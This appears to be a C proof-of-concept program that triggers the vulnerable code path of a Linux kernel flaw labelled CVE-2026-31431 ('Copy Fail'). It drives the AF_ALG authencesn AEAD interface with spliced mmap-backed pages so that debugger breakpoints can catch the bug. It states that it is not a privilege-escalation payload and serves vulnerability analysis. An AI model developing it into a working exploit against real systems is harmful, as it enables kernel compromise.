// SPDX-License-Identifier: MIT
/*
 * Analysis trigger for CVE-2026-31431 / Copy Fail.
 *
 * This is intentionally a non-privilege-escalation payload. It drives the
 * AF_ALG AEAD/authencesn path so GDB breakpoints can inspect aead_sendmsg(),
 * _aead_recvmsg(), authencesn encrypt/decrypt, and scatterlist handling.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_IV
#define ALG_SET_IV 2
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_SET_AEAD_ASSOCLEN
#define ALG_SET_AEAD_ASSOCLEN 4
#endif

#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 5
#endif

#ifndef ALG_OP_DECRYPT
#define ALG_OP_DECRYPT 0
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif

#define ALG_MAX_SALG_TYPE 14
#define ALG_MAX_SALG_NAME 64
#define CRYPTO_AUTHENC_KEYA_PARAM 1
#define RTA_ALIGNTO 4
#define RTA_ALIGN(len) (((len) + RTA_ALIGNTO - 1) & ~(RTA_ALIGNTO - 1))
#define RTA_LENGTH(len) (RTA_ALIGN(sizeof(struct rtattr)) + (len))

struct sockaddr_alg {
	sa_family_t salg_family;
	uint8_t salg_type[ALG_MAX_SALG_TYPE];
	uint32_t salg_feat;
	uint32_t salg_mask;
	uint8_t salg_name[ALG_MAX_SALG_NAME];
};

struct af_alg_iv {
	uint32_t ivlen;
	uint8_t iv[];
};

struct rtattr {
	uint16_t rta_len;
	uint16_t rta_type;
};

struct crypto_authenc_key_param {
	uint32_t enckeylen;
};

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static int setup_tfm(void)
{
	int tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfm < 0)
		die("socket(AF_ALG)");

	struct sockaddr_alg sa;
	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type));
	strncpy((char *)sa.salg_name, "authencesn(hmac(sha256),cbc(aes))",
		sizeof(sa.salg_name));

	if (bind(tfm, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind authencesn(hmac(sha256),cbc(aes))");

	struct {
		struct rtattr rta;
		struct crypto_authenc_key_param param;
		uint8_t auth_key[32];
		uint8_t enc_key[16];
	} key;
	memset(&key, 0, sizeof(key));
	key.rta.rta_len = RTA_LENGTH(sizeof(key.param));
	key.rta.rta_type = CRYPTO_AUTHENC_KEYA_PARAM;
	key.param.enckeylen = htonl(sizeof(key.enc_key));
	memset(key.auth_key, 0x41, sizeof(key.auth_key));
	memset(key.enc_key, 0x42, sizeof(key.enc_key));

	if (setsockopt(tfm, SOL_ALG, ALG_SET_KEY, &key, sizeof(key)) < 0)
		die("setsockopt ALG_SET_KEY");

	int authsize = 16;
	if (setsockopt(tfm, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
		       &authsize, sizeof(authsize)) < 0)
		die("setsockopt ALG_SET_AEAD_AUTHSIZE");

	return tfm;
}

static void *mapped_input(const char *path, const uint8_t *src, size_t len,
			  int *fd_out)
{
	int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (fd < 0)
		die("open mmap input");
	if (ftruncate(fd, (off_t)len) < 0)
		die("ftruncate mmap input");

	void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (p == MAP_FAILED)
		die("mmap input");

	memcpy(p, src, len);
	if (msync(p, len, MS_SYNC) < 0)
		die("msync input");
	*fd_out = fd;
	return p;
}

static ssize_t run_aead_once(int tfm, int op, const uint8_t *input,
			     size_t input_len, uint8_t *output,
			     size_t output_len, int use_splice,
			     const char *tag)
{
	int opfd = accept(tfm, NULL, 0);
	if (opfd < 0)
		die("accept AF_ALG op");

	uint8_t iv[16];
	memset(iv, 0x11, sizeof(iv));

	char control[CMSG_SPACE(sizeof(uint32_t)) +
		     CMSG_SPACE(sizeof(uint32_t)) +
		     CMSG_SPACE(sizeof(struct af_alg_iv) + sizeof(iv))];
	memset(control, 0, sizeof(control));

	struct iovec iov = {
		.iov_base = (void *)input,
		.iov_len = input_len,
	};

	struct msghdr msg;
	memset(&msg, 0, sizeof(msg));
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = control;
	msg.msg_controllen = sizeof(control);

	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *)CMSG_DATA(cmsg) = (uint32_t)op;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *)CMSG_DATA(cmsg) = 16;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_IV;
	cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cmsg);
	aiv->ivlen = sizeof(iv);
	memcpy(aiv->iv, iv, sizeof(iv));

	int flags = use_splice ? MSG_SPLICE_PAGES : 0;
	ssize_t sent = sendmsg(opfd, &msg, flags);
	if (sent < 0 && use_splice) {
		fprintf(stderr, "[!] %s sendmsg MSG_SPLICE_PAGES failed: %s\n",
			tag, strerror(errno));
		close(opfd);
		return run_aead_once(tfm, op, input, input_len, output,
				     output_len, 0, tag);
	}
	if (sent < 0)
		die("sendmsg AF_ALG");

	printf("[+] %s sendmsg sent=%zd flags=0x%x\n", tag, sent, flags);

	int old_flags = fcntl(opfd, F_GETFL, 0);
	if (old_flags >= 0)
		(void)fcntl(opfd, F_SETFL, old_flags | O_NONBLOCK);

	ssize_t got = -1;
	for (int i = 0; i < 50; i++) {
		got = recv(opfd, output, output_len, 0);
		if (got >= 0)
			break;
		if (errno != EAGAIN && errno != EWOULDBLOCK)
			die("recv AF_ALG");
		usleep(100000);
	}

	if (got < 0) {
		fprintf(stderr, "[!] %s recv timed out after sendmsg\n", tag);
		close(opfd);
		return -1;
	}

	printf("[+] %s recv got=%zd\n", tag, got);
	close(opfd);
	return got;
}

int main(int argc, char **argv)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	int use_splice = 1;
	if (argc > 1 && strcmp(argv[1], "--no-splice") == 0)
		use_splice = 0;

	const size_t assoc_len = 16;
	const size_t plain_len = 32;
	const size_t auth_len = 16;
	const size_t input_len = assoc_len + plain_len;

	uint8_t plain[input_len];
	for (size_t i = 0; i < input_len; i++)
		plain[i] = (uint8_t)(0x30 + (i & 0x0f));

	uint8_t enc[input_len + auth_len + 32];
	uint8_t dec[input_len + 32];
	memset(enc, 0, sizeof(enc));
	memset(dec, 0, sizeof(dec));

	int tfm = setup_tfm();

	int mapfd = -1;
	void *input = (void *)plain;
	if (use_splice)
		input = mapped_input("/tmp/copyfail_plain.bin", plain,
				     input_len, &mapfd);

	ssize_t enc_len = run_aead_once(tfm, ALG_OP_ENCRYPT, input, input_len,
					enc, input_len + auth_len,
					use_splice, "enc");

	if (use_splice) {
		munmap(input, input_len);
		close(mapfd);
		mapfd = -1;
	}

	if (enc_len <= 0) {
		close(tfm);
		printf("[+] copyfail_probe stopped after encrypt trigger\n");
		return 0;
	}

	void *dec_input = enc;
	if (use_splice)
		dec_input = mapped_input("/tmp/copyfail_cipher.bin", enc,
					 (size_t)enc_len, &mapfd);

	(void)run_aead_once(tfm, ALG_OP_DECRYPT, dec_input, (size_t)enc_len,
			    dec, (size_t)enc_len - auth_len,
			    use_splice, "dec");

	if (use_splice) {
		munmap(dec_input, (size_t)enc_len);
		close(mapfd);
	}

	close(tfm);
	printf("[+] copyfail_probe complete\n");
	return 0;
}
